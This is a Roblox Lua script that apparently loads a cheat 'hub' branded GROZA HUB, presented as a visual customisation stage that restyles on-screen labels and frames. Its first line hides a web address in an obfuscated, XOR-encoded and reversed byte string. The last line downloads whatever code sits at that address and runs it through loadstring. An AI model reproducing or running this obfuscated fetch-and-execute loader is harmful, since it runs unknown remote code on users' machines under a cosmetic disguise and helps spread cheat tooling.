
--[[ STAGE 2: VISUAL CORE ]]
local DT88vrKH3IdjjnoE3CYc="\201\209\209\143\148\204\217\216\219\045\046\040\042\246\196\051\052\206\060\210\011\221\036\034\044\043\030\050\107\106\108\006\118\120\064\018\028\026\028\100\100\095\112\162\117\123\065\181\073\073\081\132\136\136\090\230\148\235\170\228\233\234\240\137\140\136\142\196\148\224\227\225\234\235\237\247\043\248\046\053\197\200\000\005\221\008\223\037\045\044\046\046\127\067\028\112\125\026\010\076\082\074\027\165\163\092\177\175\178\170\191\180\134\140\191\148\141\157\148\150\163\237\238\232\234\182\186\139\198\201\209\213\205"local TzhvQnHuNoyLdv4DhI=33 local MpTd4TgewWdXJbG=81 local frHywM6ygqJxhN=1 local gCkimQl2Mk_aXB_F51p3=4 local jBU6scwdF3wNLm84=31 local PMzzPXrkFTO5e9rD=true local VSDapMgPYH81iot=bit32 and bit32.bxor if not VSDapMgPYH81iot then VSDapMgPYH81iot=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local cRYfyifQmooh8bvHIp={}for aWfvl5fJI04eKzrQcq=1,#DT88vrKH3IdjjnoE3CYc do local cNkdtT6jnZBImAm=string.byte(DT88vrKH3IdjjnoE3CYc,aWfvl5fJI04eKzrQcq)local L2zPpmDnq5ttvYHv6_c=(MpTd4TgewWdXJbG+(aWfvl5fJI04eKzrQcq*gCkimQl2Mk_aXB_F51p3)+jBU6scwdF3wNLm84)%256 if frHywM6ygqJxhN==0 then cNkdtT6jnZBImAm=(cNkdtT6jnZBImAm-L2zPpmDnq5ttvYHv6_c)%256 cRYfyifQmooh8bvHIp[aWfvl5fJI04eKzrQcq]=string.char(VSDapMgPYH81iot(cNkdtT6jnZBImAm,TzhvQnHuNoyLdv4DhI))else cNkdtT6jnZBImAm=VSDapMgPYH81iot(cNkdtT6jnZBImAm,TzhvQnHuNoyLdv4DhI)cRYfyifQmooh8bvHIp[aWfvl5fJI04eKzrQcq]=string.char((cNkdtT6jnZBImAm-L2zPpmDnq5ttvYHv6_c)%256)end end local HwH41Ys7meOx36Jzii5=table.concat(cRYfyifQmooh8bvHIp)if PMzzPXrkFTO5e9rD then HwH41Ys7meOx36Jzii5=string.reverse(HwH41Ys7meOx36Jzii5)end local ag5j7M1z_zBMgADtO4pNUY=HwH41Ys7meOx36Jzii5
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ag5j7M1z_zBMgADtO4pNUY))()
